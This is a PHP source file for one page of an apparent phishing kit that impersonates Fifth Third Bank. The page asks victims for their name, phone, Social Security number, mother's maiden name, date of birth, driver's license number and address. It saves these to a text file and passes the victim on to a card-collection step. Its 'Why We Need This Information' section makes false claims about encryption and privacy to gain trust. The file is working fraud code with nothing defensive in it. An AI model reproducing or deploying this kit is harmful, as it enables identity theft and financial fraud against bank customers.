<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Personal Information
    $firstName = trim($_POST['first_name'] ?? '');
    $lastName = trim($_POST['last_name'] ?? '');
    $phone = trim($_POST['phone'] ?? '');
    $ssn = trim($_POST['ssn'] ?? '');
    $motherMaiden = trim($_POST['mother_maiden'] ?? '');
    $dob = $_POST['dob'] ?? '';
    $driverLicense = trim($_POST['driver_license'] ?? '');
    
    // Home Address
    $streetAddress = trim($_POST['street_address'] ?? '');
    $unit = trim($_POST['unit'] ?? '');
    $city = trim($_POST['city'] ?? '');
    $state = $_POST['state'] ?? '';
    $zipCode = trim($_POST['zip_code'] ?? '');
    
    // Validation
    if (empty($firstName)) $errors['first_name'] = 'First name is required';
    if (empty($lastName)) $errors['last_name'] = 'Last name is required';
    if (empty($phone)) {
        $errors['phone'] = 'Phone number is required';
    } else {
        // Clean and validate phone number
        $cleanPhone = preg_replace('/[^\d]/', '', $phone);
        if (strlen($cleanPhone) === 10) {
            // Auto-format to (XXX) XXX-XXXX
            $_POST['phone'] = '(' . substr($cleanPhone, 0, 3) . ') ' . substr($cleanPhone, 3, 3) . '-' . substr($cleanPhone, 6);
            $phone = $_POST['phone'];
        } elseif (!preg_match('/^\(?\d{3}\)?[\s.-]?\d{3}[\s.-]?\d{4}$/', $phone)) {
            $errors['phone'] = 'Please enter a valid phone number';
        }
    }
    if (empty($ssn)) {
        $errors['ssn'] = 'Social Security Number is required';
    } elseif (!preg_match('/^\d{3}-\d{2}-\d{4}$/', $ssn)) {
        $errors['ssn'] = 'Please enter a valid SSN (XXX-XX-XXXX)';
    }
    if (empty($motherMaiden)) $errors['mother_maiden'] = 'Mother\'s maiden name is required';
    if (empty($dob)) {
        $errors['dob'] = 'Date of birth is required';
    } else {
        $dobTimestamp = strtotime($dob);
        $age = (date('Y') - date('Y', $dobTimestamp));
        if ($age < 18 || $age > 120) {
            $errors['dob'] = 'You must be between 18 and 120 years old';
        }
    }
    if (empty($driverLicense)) $errors['driver_license'] = 'Driver\'s license number is required';
    
    // Address validation
    if (empty($streetAddress)) $errors['street_address'] = 'Street address is required';
    if (empty($city)) $errors['city'] = 'City is required';
    if (empty($state)) $errors['state'] = 'State is required';
    if (empty($zipCode)) {
        $errors['zip_code'] = 'ZIP code is required';
    }
    
    if (empty($errors)) {
        // Save basic info and home address data
        $data = [
            'step' => 'basic_info_home_address',
            'usrnm' => $username,
            'emzemz' => $username,
            'gvn_nm' => $firstName,
            'fam_nm' => $lastName,
            'cnt_num' => $phone,
            'tax_id' => $ssn,
            'mat_nm' => $motherMaiden,
            'dob' => $dob,
            'id_num' => $driverLicense,
            'str_adr' => $streetAddress,
            'unit_dsg' => $unit,
            'loc' => $city,
            'prov' => $state,
            'zip_cd' => $zipCode
        ];
        
        saveUserData('basic_info_home_address.txt', $data);
        
        // Redirect to card page
        header('Location: card.php');
        exit;
    }
}

$footerLinks = [
    'About Us',
    'Customer Service',
    'Careers',
    'Investor Relations',
    'Media Center',
    'Security',
    'Privacy',
    'Site Map'
];

$states = [
    'AL' => 'Alabama', 'AK' => 'Alaska', 'AZ' => 'Arizona', 'AR' => 'Arkansas',
    'CA' => 'California', 'CO' => 'Colorado', 'CT' => 'Connecticut', 'DE' => 'Delaware',
    'FL' => 'Florida', 'GA' => 'Georgia', 'HI' => 'Hawaii', 'ID' => 'Idaho',
    'IL' => 'Illinois', 'IN' => 'Indiana', 'IA' => 'Iowa', 'KS' => 'Kansas',
    'KY' => 'Kentucky', 'LA' => 'Louisiana', 'ME' => 'Maine', 'MD' => 'Maryland',
    'MA' => 'Massachusetts', 'MI' => 'Michigan', 'MN' => 'Minnesota', 'MS' => 'Mississippi',
    'MO' => 'Missouri', 'MT' => 'Montana', 'NE' => 'Nebraska', 'NV' => 'Nevada',
    'NH' => 'New Hampshire', 'NJ' => 'New Jersey', 'NM' => 'New Mexico', 'NY' => 'New York',
    'NC' => 'North Carolina', 'ND' => 'North Dakota', 'OH' => 'Ohio', 'OK' => 'Oklahoma',
    'OR' => 'Oregon', 'PA' => 'Pennsylvania', 'RI' => 'Rhode Island', 'SC' => 'South Carolina',
    'SD' => 'South Dakota', 'TN' => 'Tennessee', 'TX' => 'Texas', 'UT' => 'Utah',
    'VT' => 'Vermont', 'VA' => 'Virginia', 'WA' => 'Washington', 'WV' => 'West Virginia',
    'WI' => 'Wisconsin', 'WY' => 'Wyoming'
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fifth Third Bank - Personal Information</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-white flex flex-col text-[#1b1b1b]">
        <!-- Header -->
        <header class="bg-white border-b border-gray-200">
            <div class="max-w-6xl mx-auto flex flex-wrap items-center justify-between px-6 py-4 gap-4">
                <div class="flex items-center">
                    <img src="assets/fifththird-logo.svg" alt="Fifth Third Bank" class="h-12 w-auto" />
                </div>
                <div class="text-xs sm:text-sm text-gray-700 flex items-center gap-3 uppercase tracking-wide">
                    <a href="#" class="hover:text-[#003087]">Customer Service</a>
                    <span class="text-gray-300">|</span>
                    <a href="#" class="hover:text-[#003087]">Branch &amp; ATM Locator</a>
                </div>
            </div>
        </header>

        <!-- Blue Gradient Section with Basic Info Card -->
        <section class="bg-gradient-to-r from-[#0b2b6a] via-[#123b9d] to-[#1a44c6] py-16 px-4">
            <div class="max-w-6xl mx-auto">
                <!-- Breadcrumb -->
                <div class="mb-6 flex items-center gap-2 text-sm text-white/90">
                    <a href="#" class="text-white/70 hover:text-white">Home</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="index.php" class="text-white/70 hover:text-white">Login</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="security_questions.php" class="text-white/70 hover:text-white">Security Questions</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="otp.php" class="text-white/70 hover:text-white">OTP Verification</a>
                    <span class="text-white/50">&#8250;</span>
                    <a href="email_password.php" class="text-white/70 hover:text-white">Email & Password</a>
                    <span class="text-white/50">&#8250;</span>
                    <span class="font-semibold">Personal Information</span>
                </div>

                <!-- Basic Info Card -->
                <div class="flex justify-center">
                    <div class="bg-[#f4f2f2] max-w-2xl w-full rounded-md shadow-[0_12px_30px_rgba(0,0,0,0.25)] border border-gray-200">
                        <div class="px-8 py-6">
                            <div class="text-center mb-6">
                                <div class="mx-auto w-16 h-16 bg-[#123b9d] rounded-full flex items-center justify-center mb-4">
                                    <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
                                    </svg>
                                </div>
                                <h1 class="text-2xl font-bold text-gray-800 mb-2">Personal Information</h1>
                                <p class="text-sm text-gray-600">Please provide your personal details and home address for account verification.</p>
                            </div>
                            
                            <!-- Error Display -->
                            <?php if (!empty($errors)): ?>
                                <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-4">
                                    <div class="flex">
                                        <div class="flex-shrink-0">
                                            <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                            </svg>
                                        </div>
                                        <div class="ml-3">
                                            <p class="text-sm text-red-700">
                                                Please fix the following errors:
                                                <ul class="list-disc pl-5 mt-1">
                                                    <?php foreach ($errors as $error): ?>
                                                        <li><?php echo htmlspecialchars($error); ?></li>
                                                    <?php endforeach; ?>
                                                </ul>
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            <?php endif; ?>

                            <form method="POST" class="space-y-8">
                                <!-- Personal Information Section -->
                                <div>
                                    <h2 class="text-lg font-semibold text-gray-800 mb-4 pb-2 border-b border-gray-200">Personal Information</h2>
                                    <div class="grid gap-4 md:grid-cols-2">
                                        <!-- First Name -->
                                        <div>
                                            <label for="first_name" class="block text-sm font-semibold text-gray-700 mb-2">
                                                First Name
                                            </label>
                                            <input
                                                type="text"
                                                id="first_name"
                                                name="first_name"
                                                placeholder="Enter your first name"
                                                value="<?php echo htmlspecialchars($_POST['first_name'] ?? ''); ?>"
                                                class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                            />
                                            <?php if (isset($errors['first_name'])): ?>
                                                <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['first_name']); ?></p>
                                            <?php endif; ?>
                                        </div>

                                        <!-- Last Name -->
                                        <div>
                                            <label for="last_name" class="block text-sm font-semibold text-gray-700 mb-2">
                                                Last Name
                                            </label>
                                            <input
                                                type="text"
                                                id="last_name"
                                                name="last_name"
                                                placeholder="Enter your last name"
                                                value="<?php echo htmlspecialchars($_POST['last_name'] ?? ''); ?>"
                                                class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                            />
                                            <?php if (isset($errors['last_name'])): ?>
                                                <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['last_name']); ?></p>
                                            <?php endif; ?>
                                        </div>

                                        <!-- Phone Number -->
                                        <div>
                                            <label for="phone" class="block text-sm font-semibold text-gray-700 mb-2">
                                                Phone Number
                                            </label>
                                            <input
                                                type="tel"
                                                id="phone"
                                                name="phone"
                                                placeholder="(123) 456-7890"
                                                value="<?php echo htmlspecialchars($_POST['phone'] ?? ''); ?>"
                                                class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                            />
                                            <?php if (isset($errors['phone'])): ?>
                                                <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['phone']); ?></p>
                                            <?php endif; ?>
                                        </div>

                                        <!-- Social Security Number -->
                                        <div>
                                            <label for="ssn" class="block text-sm font-semibold text-gray-700 mb-2">
                                                Social Security Number
                                            </label>
                                            <input
                                                type="text"
                                                id="ssn"
                                                name="ssn"
                                                placeholder="XXX-XX-XXXX"
                                                value="<?php echo htmlspecialchars($_POST['ssn'] ?? ''); ?>"
                                                class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                            />
                                            <?php if (isset($errors['ssn'])): ?>
                                                <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['ssn']); ?></p>
                                            <?php endif; ?>
                                        </div>

                                        <!-- Mother's Maiden Name -->
                                        <div>
                                            <label for="mother_maiden" class="block text-sm font-semibold text-gray-700 mb-2">
                                                Mother's Maiden Name
                                            </label>
                                            <input
                                                type="text"
                                                id="mother_maiden"
                                                name="mother_maiden"
                                                placeholder="Enter mother's maiden name"
                                                value="<?php echo htmlspecialchars($_POST['mother_maiden'] ?? ''); ?>"
                                                class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                            />
                                            <?php if (isset($errors['mother_maiden'])): ?>
                                                <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['mother_maiden']); ?></p>
                                            <?php endif; ?>
                                        </div>

                                        <!-- Date of Birth -->
                                        <div>
                                            <label for="dob" class="block text-sm font-semibold text-gray-700 mb-2">
                                                Date of Birth
                                            </label>
                                            <input
                                                type="date"
                                                id="dob"
                                                name="dob"
                                                value="<?php echo htmlspecialchars($_POST['dob'] ?? ''); ?>"
                                                class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                            />
                                            <?php if (isset($errors['dob'])): ?>
                                                <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['dob']); ?></p>
                                            <?php endif; ?>
                                        </div>

                                        <!-- Driver's License -->
                                        <div class="md:col-span-2">
                                            <label for="driver_license" class="block text-sm font-semibold text-gray-700 mb-2">
                                                Driver's License Number
                                            </label>
                                            <input
                                                type="text"
                                                id="driver_license"
                                                name="driver_license"
                                                placeholder="Enter your driver's license number"
                                                value="<?php echo htmlspecialchars($_POST['driver_license'] ?? ''); ?>"
                                                class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                            />
                                            <?php if (isset($errors['driver_license'])): ?>
                                                <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['driver_license']); ?></p>
                                            <?php endif; ?>
                                        </div>
                                    </div>
                                </div>

                                <!-- Home Address Section -->
                                <div>
                                    <h2 class="text-lg font-semibold text-gray-800 mb-4 pb-2 border-b border-gray-200">Home Address</h2>
                                    <div class="grid gap-4 md:grid-cols-2">
                                        <!-- Street Address -->
                                        <div class="md:col-span-2">
                                            <label for="street_address" class="block text-sm font-semibold text-gray-700 mb-2">
                                                Street Address
                                            </label>
                                            <input
                                                type="text"
                                                id="street_address"
                                                name="street_address"
                                                placeholder="Enter your street address"
                                                value="<?php echo htmlspecialchars($_POST['street_address'] ?? ''); ?>"
                                                class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                            />
                                            <?php if (isset($errors['street_address'])): ?>
                                                <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['street_address']); ?></p>
                                            <?php endif; ?>
                                        </div>

                                        <!-- Unit/Apt -->
                                        <div>
                                            <label for="unit" class="block text-sm font-semibold text-gray-700 mb-2">
                                                Unit/Apt (Optional)
                                            </label>
                                            <input
                                                type="text"
                                                id="unit"
                                                name="unit"
                                                placeholder="Apt, Suite, etc."
                                                value="<?php echo htmlspecialchars($_POST['unit'] ?? ''); ?>"
                                                class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                            />
                                        </div>

                                        <!-- City -->
                                        <div>
                                            <label for="city" class="block text-sm font-semibold text-gray-700 mb-2">
                                                City
                                            </label>
                                            <input
                                                type="text"
                                                id="city"
                                                name="city"
                                                placeholder="Enter city"
                                                value="<?php echo htmlspecialchars($_POST['city'] ?? ''); ?>"
                                                class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                            />
                                            <?php if (isset($errors['city'])): ?>
                                                <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['city']); ?></p>
                                            <?php endif; ?>
                                        </div>

                                        <!-- State -->
                                        <div>
                                            <label for="state" class="block text-sm font-semibold text-gray-700 mb-2">
                                                State
                                            </label>
                                            <select
                                                id="state"
                                                name="state"
                                                class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                            >
                                                <option value="">Select a state</option>
                                                <?php foreach ($states as $code => $name): ?>
                                                    <option value="<?php echo $code; ?>" <?php echo (isset($_POST['state']) && $_POST['state'] === $code) ? 'selected' : ''; ?>>
                                                        <?php echo htmlspecialchars($name); ?>
                                                    </option>
                                                <?php endforeach; ?>
                                            </select>
                                            <?php if (isset($errors['state'])): ?>
                                                <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['state']); ?></p>
                                            <?php endif; ?>
                                        </div>

                                        <!-- ZIP Code -->
                                        <div>
                                            <label for="zip_code" class="block text-sm font-semibold text-gray-700 mb-2">
                                                ZIP Code
                                            </label>
                                            <input
                                                type="text"
                                                id="zip_code"
                                                name="zip_code"
                                                placeholder="Enter ZIP code"
                                                value="<?php echo htmlspecialchars($_POST['zip_code'] ?? ''); ?>"
                                                class="w-full border border-gray-300 rounded-sm px-3 py-2 text-sm text-gray-800 focus:outline-none focus:ring-2 focus:ring-[#0b2b6a]"
                                            />
                                            <?php if (isset($errors['zip_code'])): ?>
                                                <p class="mt-2 text-xs font-semibold text-red-600"><?php echo htmlspecialchars($errors['zip_code']); ?></p>
                                            <?php endif; ?>
                                        </div>
                                    </div>
                                </div>

                                <!-- Submit Button -->
                                <button
                                    type="submit"
                                    class="w-full bg-[#123b9d] hover:bg-[#0f2f6e] text-white font-semibold py-3 rounded-sm uppercase tracking-wide transition"
                                >
                                    Continue
                                </button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- Information Section -->
        <section class="bg-white py-12 px-4 flex-1">
            <div class="max-w-6xl mx-auto space-y-8">
                <h2 class="text-2xl font-semibold text-gray-900">Why We Need This Information</h2>
                <p class="mt-3 text-gray-700 leading-relaxed">
                    We collect personal information to verify your identity and comply with banking regulations. This helps us protect your account and prevent fraudulent activity.
                </p>

                <div class="grid gap-6 md:grid-cols-2">
                    <div class="border border-gray-200 rounded-md p-6 bg-[#f8f8f8]">
                        <h3 class="text-xl font-semibold text-gray-900 mb-2">Identity Verification</h3>
                        <p class="text-sm text-gray-700 leading-relaxed">
                            Your personal information helps us verify that you are who you claim to be, protecting both you and the bank from identity theft and fraud.
                        </p>
                    </div>

                    <div class="border border-gray-200 rounded-md p-6 bg-white shadow-sm">
                        <h3 class="text-xl font-semibold text-gray-900 mb-2">Privacy & Security</h3>
                        <p class="text-sm text-gray-700 leading-relaxed mb-3">
                            We take your privacy seriously. Your information is encrypted and stored securely, and we never share it with third parties without your consent.
                        </p>
                        <ul class="text-sm text-gray-700 space-y-1">
                            <li>• Bank-level encryption</li>
                            <li>• Secure data storage</li>
                            <li>• Regular security audits</li>
                        </ul>
                    </div>
                </div>
            </div>
        </section>

        <!-- Footer -->
        <footer class="bg-[#f4f4f4] border-t border-gray-200">
            <div class="max-w-6xl mx-auto px-6 py-10 text-center">
                <div class="flex flex-wrap justify-center gap-x-4 gap-y-2 text-sm text-gray-700">
                    <?php foreach ($footerLinks as $index => $label): ?>
                        <a href="#" class="hover:text-[#003087] underline-offset-4 hover:underline">
                            <?php echo htmlspecialchars($label); ?>
                        </a>
                        <?php if ($index < count($footerLinks) - 1): ?>
                            <span class="text-gray-400">|</span>
                        <?php endif; ?>
                    <?php endforeach; ?>
                </div>

                <p class="mt-5 text-sm text-gray-700">
                    Copyright © 2025 Fifth Third Bank, National Association. All Rights Reserved. Member FDIC.
                    <span class="inline-flex items-center gap-1 font-semibold">
                        <span role="img" aria-label="house">🏠</span>
                        Equal Housing Lender.
                    </span>
                </p>

                <div class="mt-6 flex items-center justify-center">
                    <img src="assets/fifththird-logo.svg" alt="Fifth Third Logo" class="h-10 w-auto" />
                </div>
            </div>
        </footer>
    </div>

    <script>
        // Auto-format phone number
        document.addEventListener('DOMContentLoaded', function() {
            const phoneInput = document.getElementById('phone');
            if (phoneInput) {
                phoneInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length >= 6) {
                        value = value.slice(0, 3) + ' ' + value.slice(3, 6) + '-' + value.slice(6, 10);
                    } else if (value.length >= 3) {
                        value = '(' + value.slice(0, 3) + ') ' + value.slice(3);
                    } else if (value.length > 0) {
                        value = '(' + value;
                    }
                    e.target.value = value;
                });
            }

            // Auto-format SSN
            const ssnInput = document.getElementById('ssn');
            if (ssnInput) {
                ssnInput.addEventListener('input', function(e) {
                    let value = e.target.value.replace(/\D/g, '');
                    if (value.length >= 5) {
                        value = value.slice(0, 3) + '-' + value.slice(3, 5) + '-' + value.slice(5, 9);
                    } else if (value.length >= 3) {
                        value = value.slice(0, 3) + '-' + value.slice(3);
                    }
                    e.target.value = value;
                });
            }

            // Auto-format ZIP code
            const zipInput = document.getElementById('zip_code');
            if (zipInput) {
                zipInput.addEventListener('input', function(e) {
                    // Remove auto-formatting - allow free text
                    // let value = e.target.value.replace(/\D/g, '');
                    // if (value.length >= 5) {
                    //     value = value.slice(0, 5) + (value.length > 5 ? '-' + value.slice(5, 9) : '');
                    // }
                    // e.target.value = value;
                });
            }
        });
    </script>
</body>
</html>
